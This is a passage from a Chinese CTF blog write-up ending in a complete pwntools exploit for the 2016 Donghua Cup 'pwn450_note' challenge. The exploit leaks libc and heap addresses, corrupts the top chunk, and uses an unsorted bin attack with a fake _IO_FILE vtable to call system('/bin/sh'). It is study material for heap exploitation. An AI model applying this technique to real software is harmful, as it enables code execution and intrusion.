class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"># context.log_level = &#x27;debug&#x27;</span><br><span class="line"># context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">sh = process(&#x27;./main&#x27;)</span><br><span class="line">libc = ELF(&#x27;./libc-2.23.so&#x27;)</span><br><span class="line"></span><br><span class="line">def menu(choice):</span><br><span class="line">    sh.sendlineafter(&quot;option---&gt;&gt;&quot;, str(choice))</span><br><span class="line"></span><br><span class="line">def add(size):</span><br><span class="line">    menu(1)</span><br><span class="line">    sh.sendlineafter(&quot;input the size:&quot;, str(size))</span><br><span class="line"></span><br><span class="line">def edit(content):</span><br><span class="line">    menu(3)</span><br><span class="line">    sh.sendlineafter(&quot;input the content:&quot;, content)</span><br><span class="line"></span><br><span class="line">def delete():</span><br><span class="line">    menu(4)</span><br><span class="line"></span><br><span class="line"># gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">#leak libc address</span><br><span class="line">add(0x2000000)</span><br><span class="line"></span><br><span class="line">libc.address = int(sh.recv(14), 16) + 0x2001000 - 0x10</span><br><span class="line">print(hex(libc.address))</span><br><span class="line"></span><br><span class="line">#find function address</span><br><span class="line">system = libc.sym[&#x27;system&#x27;] + 0x10</span><br><span class="line">_IO_list_all = libc.sym[&#x27;_IO_list_all&#x27;]</span><br><span class="line">main_arena = libc.sym[&#x27;__malloc_hook&#x27;] + 0x10</span><br><span class="line">unsorted_bin_head = main_arena + 88</span><br><span class="line"></span><br><span class="line">delete()</span><br><span class="line"></span><br><span class="line">#leak heap address</span><br><span class="line">add(0x200)</span><br><span class="line">heap = int(sh.recv(9), 16) - 0x10</span><br><span class="line">print(hex(heap))</span><br><span class="line"></span><br><span class="line"># gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">#edit top chunk size</span><br><span class="line">payload = &#x27;a&#x27;*0x200</span><br><span class="line">payload += p64(0) + p64(0xdf1)</span><br><span class="line"># payload += &#x27;\x00&#x27;*0x18 + p64(0x21)</span><br><span class="line">edit(payload)</span><br><span class="line"></span><br><span class="line">delete()</span><br><span class="line"># After free, 0x200 chunk will merge with top chunk </span><br><span class="line"></span><br><span class="line"># gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">#let old top chunk into unsorted bin</span><br><span class="line">add(0x1000)</span><br><span class="line"></span><br><span class="line"># gdb.attach(sh)</span><br><span class="line"></span><br><span class="line"># pause()</span><br><span class="line"></span><br><span class="line">delete()</span><br><span class="line"># the chunk by free in this time is malloc by new top chunk, after free, it will be merge with new top chunk</span><br><span class="line"></span><br><span class="line"># gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">add(0x200)</span><br><span class="line"># the chunk is cut from unsorted bin(old top chunk), which is merged before.</span><br><span class="line"># we get the first chunk which is used to leak heap address.</span><br><span class="line"># And old top chunk become the first appearance.</span><br><span class="line"></span><br><span class="line">payload = &quot;a&quot;*0x200</span><br><span class="line">payload += p64(0) + p64(0xdd1)  #old top chunk size</span><br><span class="line">payload += p64(unsorted_bin_head) +p64(unsorted_bin_head)</span><br><span class="line">payload += &#x27;\x00&#x27;*0xdb0</span><br><span class="line">payload += p64(0xdd0) + p64(0x11)</span><br><span class="line"># payload += p64(0x0) + p64(0x11)</span><br><span class="line">edit(payload)</span><br><span class="line"># make the next chunk&#x27;s prev_inuse of old top chunk is 1</span><br><span class="line"># prev_size is necessary.</span><br><span class="line"></span><br><span class="line"># pause()</span><br><span class="line"></span><br><span class="line"># gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">delete()</span><br><span class="line"># two chunk in unsorted bin(not marge because the letter&#x27;s prev_inuse is 1)</span><br><span class="line"># gdb.attach(sh)</span><br><span class="line"># pause()</span><br><span class="line"></span><br><span class="line">add(0x210)</span><br><span class="line"># traversal the unsorted bin: first is 0x200; second is old top chunk</span><br><span class="line"># first will be put into smallbin.</span><br><span class="line"># 0x210 will cut from second.</span><br><span class="line"></span><br><span class="line"># pause()</span><br><span class="line"></span><br><span class="line">delete()</span><br><span class="line"># not merge again</span><br><span class="line"># two chunk in unsorted bin</span><br><span class="line"></span><br><span class="line">add(0x200)</span><br><span class="line"># malloc from smallbin </span><br><span class="line"></span><br><span class="line"># gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">payload = &quot;a&quot;*0x200</span><br><span class="line">payload += p64(0x210) + p64(0x221)</span><br><span class="line">payload += p64(heap + 0x430) + p64(unsorted_bin_head)</span><br><span class="line">payload +=  &#x27;\x00&#x27;*0x200</span><br><span class="line"></span><br><span class="line">fake_buf = &#x27;/bin/sh\x00&#x27; + p64(0x61) + p64(0) + p64(_IO_list_all - 0x10)</span><br><span class="line">fake_buf += p64(0)</span><br><span class="line">fake_buf += p64(1)</span><br><span class="line">fake_buf = fake_buf.ljust(0xc0, &#x27;\x00&#x27;)</span><br><span class="line"></span><br><span class="line">fake_buf += p64(0xffffffffffffffff)</span><br><span class="line">fake_buf = fake_buf.ljust(0xd8, &#x27;\x00&#x27;)</span><br><span class="line"></span><br><span class="line">vtable = heap + 0x10 + 0x200 + 0x220 + len(fake_buf) + 8</span><br><span class="line"></span><br><span class="line">fake_buf += p64(vtable)</span><br><span class="line">fake_buf += p64(0)</span><br><span class="line">fake_buf += p64(0)</span><br><span class="line">fake_buf += p64(1)</span><br><span class="line">fake_buf += p64(system)</span><br><span class="line"></span><br><span class="line">payload += fake_buf</span><br><span class="line"></span><br><span class="line">edit(payload)</span><br><span class="line"></span><br><span class="line">delete()</span><br><span class="line"></span><br><span class="line"># gdb.attach(sh)</span><br><span class="line"># gdb.attach(proc.pidof(sh)[0])</span><br><span class="line"></span><br><span class="line">sleep(0.5)</span><br><span class="line">add(0xb00)</span><br><span class="line"># menu(6)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>


    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/PWN/" rel="tag"># -PWN</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2023/02/23/Wiki/" rel="prev" title="Wiki">
      <i class="fa fa-chevron-left"></i> Wiki
    </a></div>
      <div class="post-nav-item">
    <a href="/2023/03/09/open-getdent64-write/" rel="next" title="open getdent64 write">
      open getdent64 write <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#pwn450-note-2016%E4%B8%9C%E5%8D%8E%E6%9D%AF"><span class="nav-number">1.</span> <span class="nav-text">pwn450_note_2016东华杯</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#IDA%E5%88%86%E6%9E%90"><span class="nav-number">1.1.</span> <span class="nav-text">IDA分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0"><span class="nav-number">1.2.</span> <span class="nav-text">复现</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#leak-libc-address"><span class="nav-number">1.2.1.</span> <span class="nav-text">leak libc address</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#leak-heap-address"><span class="nav-number">1.2.2.</span> <span class="nav-text">leak heap address</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%B3%84%E9%9C%B2%E5%AE%8Clibc%E5%92%8C%E5%A0%86%E5%9C%B0%E5%9D%80%EF%BC%8C%E6%80%9D%E8%80%83%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8%EF%BC%9A"><span class="nav-number">1.2.3.</span> <span class="nav-text">泄露完libc和堆地址，思考如何利用：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#unsorted-bin-attack"><span class="nav-number">1.2.4.</span> <span class="nav-text">unsorted bin attack</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#get-unsorted-bin"><span class="nav-number">1.2.4.1.</span> <span class="nav-text">get unsorted bin</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#edit-top-chunk-size"><span class="nav-number">1.2.4.2.</span> <span class="nav-text">edit top chunk size</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#unsorted-bin-attack-1"><span class="nav-number">1.2.4.3.</span> <span class="nav-text">unsorted bin attack</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%85%88%E6%8F%90%E4%B8%8B%E4%B9%8B%E5%89%8D%E7%96%91%E6%83%91%E7%9A%84%E7%82%B9%EF%BC%9A"><span class="nav-number">1.2.4.4.</span> <span class="nav-text">先提下之前疑惑的点：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%AE%9E%E9%99%85%E8%B0%83%E8%AF%95%EF%BC%9A"><span class="nav-number">1.2.4.5.</span> <span class="nav-text">实际调试：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%BC%80%E5%A7%8B%E5%88%A9%E7%94%A8%EF%BC%9A"><span class="nav-number">1.2.4.6.</span> <span class="nav-text">开始利用：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%85%88%E7%90%86%E4%B8%80%E7%90%86%E6%95%B4%E4%B8%AA%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B%EF%BC%9A"><span class="nav-number">1.2.4.7.</span> <span class="nav-text">先理一理整个攻击流程：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#IO-FILE%E7%BB%93%E6%9E%84%E4%BD%93%E5%AD%97%E6%AE%B5%E5%B8%83%E7%BD%AE"><span class="nav-number">1.2.4.8.</span> <span class="nav-text">IO FILE结构体字段布置</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%9C%80%E5%90%8E%E6%9D%A5%E8%AF%B4%E4%B8%8B%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9C%80%E8%A6%812%E4%B8%AAunsorted-bin-chunk%E6%89%8D%E8%83%BD%E5%AE%9E%E7%8E%B0%E5%88%A9%E7%94%A8%EF%BC%9A"><span class="nav-number">1.2.4.9.</span> <span class="nav-text">最后来说下为什么需要2个unsorted bin chunk才能实现利用：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E8%A1%A5%E4%B8%8Aexp%EF%BC%9A"><span class="nav-number">1.2.4.10.</span> <span class="nav-text">补上exp：</span></a></li></ol></li></ol></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="hhhhhh_"
      src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">hhhhhh_</p>
  <div class="site-description" itemprop="description">想去北方看看</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">5</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">3</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">1</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">hhhhhh_</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  
  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
